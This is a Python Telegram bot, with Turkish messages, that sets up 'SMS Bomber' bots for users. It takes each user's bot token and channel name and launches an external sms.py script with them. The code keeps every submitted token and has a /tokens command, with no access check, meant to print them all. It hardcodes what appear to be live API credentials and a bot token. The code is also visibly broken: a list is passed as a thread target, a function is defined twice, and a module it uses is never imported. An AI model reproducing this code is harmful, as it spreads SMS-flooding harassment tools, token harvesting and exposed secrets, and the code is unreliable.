from pyrogram import *
from pyrogram.enums import *
from pyromod import * 
import subprocess, requests
from threading import Thread

bot = Client("jsksks", api_id=24588661, api_hash="332058c74190c9a3739f43676f3a21e0", bot_token="7253319872:AAGsCxP-ii5e89_qT0reOW535FLo4oV0xTE")
bot.start();
bot.set_parse_mode(ParseMode.MARKDOWN)

created_users = []
tokens = []

def cr_bot(chat, token):
  subprocess.run(["python3", "sms.py"], input=f"{token}\n{chat}", encoding="utf-8")

@bot.on_message(filters.command("start"))
def start(c, m):
  return m.reply(f"Merhaba {m.from_user.first_name}, Sms Bomber Botunu Oluşturmak İstiyorsan /bot Yaz. (Toplam bot {len(tokens)})")

@bot.on_message(filters.command("tokens"))
def tokenss(c, m):
  Thread(target=tokens, args=(m,)).start();
  
def tokenss(m):
  for token in tokens:
    m.reply("`" + token + "`")
    time.sleep(1)

@bot.on_message(filters.command("id"))
async def id(c, m):
  args = m.text.split()
  if len(args) == 1 or len(args) > 2:
    return await m.reply("Kullanıcı adını girmelisin. /id @voleriaarsiv")
  id = args[1]
  try:
    get_chat = await bot.get_chat(id)
    return await m.reply(f"**🆔 Grubun idi:** `{get_chat.id}`")
  except:
    return await m.reply("Kanalın idi alınamadı.")
  

@bot.on_message(filters.command("bot"))
async def botu_oluştur(c, m):
  chat = m.chat
  if m.from_user.id in created_users:
    return await m.reply("Botunu Zaten Oluşturmuşsun!")
  else:
    await m.reply("**Her Kullanıcı Sadece Bir(1) Tane Bot Oluşturabilir.**")
    token = await bot.ask(chat.id, "Botunuzun Tokenini Girin: ")
    if ":" not in token.text:
      return await m.reply("Geçersiz Token!")
    chat = await bot.ask(chat.id, "Kanalınızın Kullanıcı Adını @ Olmadan Girin: (Zorunlu Katılım İçin)")
    if chat.text.startswith("@"):
      return await m.reply("Kanalın Kullanıcı Adını @ Olmadan Girin.")
    Thread(target=cr_bot, args=(chat.text, token.text,)).start();
    r = requests.get(f"https://api.telegram.org/bot{token.text}/getMe")
    await m.reply("`" + r.text + "`")
    created_users.append(m.from_user.id)
    tokens.append(token.text)
    return await m.reply("Botunuz aktifleştirildi. ✅ **Not:** Kanala katılmanın çalışması için botu kanalınıza eklemelisiniz.")

print("Started!")
idle()